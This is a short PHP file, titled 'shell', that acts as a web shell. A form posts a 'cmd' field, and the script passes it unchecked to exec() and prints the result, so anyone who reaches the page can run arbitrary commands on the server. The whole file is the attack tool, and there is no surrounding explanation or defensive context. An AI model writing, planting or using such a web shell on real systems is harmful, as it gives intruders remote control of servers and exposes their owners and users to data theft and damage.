<?php
if($_SERVER["REQUEST_METHOD"]=="POST"){
    $cmd=$_POST["cmd"];
    $output=exec($cmd);
    echo $output;
}

?>

<html>
    <head>
        <title>shell</title>
        </head>
        <body>
            <form action="shell.php" method="post">
                <input type="text" name="cmd">
                <input type="submit">
            </form>
        </body>
</html>
